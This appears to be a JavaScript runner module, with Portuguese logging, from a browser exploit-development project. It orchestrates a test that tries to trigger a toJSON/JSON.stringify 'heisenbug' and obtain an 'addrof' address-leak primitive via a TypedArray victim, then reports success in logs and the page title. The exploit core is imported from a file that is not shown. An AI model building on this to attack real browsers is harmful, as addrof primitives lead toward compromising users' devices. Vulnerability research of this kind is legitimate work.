// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_SelfRefThenLeak, // ATUALIZADO para v56
    FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL // ATUALIZADO para v56
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_SelfRefThenLeak";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (SelfRefThenLeak) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_SelfRefThenLeak();

    logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    }

    if (result.errorCapturedMain) {
        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-SRTL) ERR: ${result.errorCapturedMain.name}`;
        if (result.errorCapturedMain.name === 'TypeError' && result.errorCapturedMain.message.includes("circular structure")) {
            logS3(`    NOTA: TypeError de estrutura circular. Isso é esperado e pode indicar controle.`, "good", FNAME_RUNNER);
        }
    } else {
        logS3(`  RESULTADO: Completou. Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "good", FNAME_RUNNER);
        if (result.rawStringifyForAnalysis && result.rawStringifyForAnalysis.includes("circular structure")){
             logS3(`  RAW STRINGIFY OUTPUT CONTÉM 'circular structure'. Analisar C1_details em memória se necessário.`, "warn", FNAME_RUNNER);
        }

        let heisenbugOnC1 = false;
        const call2Details = result.all_probe_calls_for_analysis.find(d => d.call_number === 2 && d.this_is_C1_details_obj);
        if (call2Details && (call2Details.C1_payloads_assigned || call2Details.direct_numeric_leak_A_val !== null || call2Details.direct_numeric_leak_B_val !== null)) {
            heisenbugOnC1 = true;
        }
         let leakTargetProbeHit = result.all_probe_calls_for_analysis.find(d => (d.this_is_leak_target_AB || d.this_is_leak_target_DV) && d.addrof_read_val !== null);


        if(heisenbugOnC1){
            logS3(`  !!!! HEISENBUG NO C1_DETAILS (Call #2) & MODIFICAÇÃO CONFIRMADAS PELA SONDA !!!!`, "critical", FNAME_RUNNER);
        } else if (leakTargetProbeHit) {
            logS3(`  !!!! ALVO DE LEAK (${leakTargetProbeHit.this_type}) SE TORNOU 'this' NA SONDA E ADDROF FOI TENTADO (Call #${leakTargetProbeHit.call_number}) !!!!`, "critical", FNAME_RUNNER);
        }
        else {
            logS3(`  ALERT: Heisenbug no C1_details (Call #2) ou alvo de leak como 'this' NÃO CONFIRMADA PELA SONDA.`, "error", FNAME_RUNNER);
        }

        let anyAddrofSuccess = (result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success);

        if (result.addrof_A_result) {
            logS3(`    ADDROF A: ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result) {
            logS3(`    ADDROF B: ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL}: Addr SUCCESS!`;
        } else if (heisenbugOnC1 || leakTargetProbeHit || (result.rawStringifyForAnalysis && result.rawStringifyForAnalysis.includes("circular structure"))) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL}: Heisenbug OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL}: No Heisenbug?`;
        }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (SelfRefThenLeak) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (SelfRefThenLeak) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
            !document.title.includes("ERR") && !document.title.includes("Heisenbug OK")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL} Concluído`;
        }
    }
}
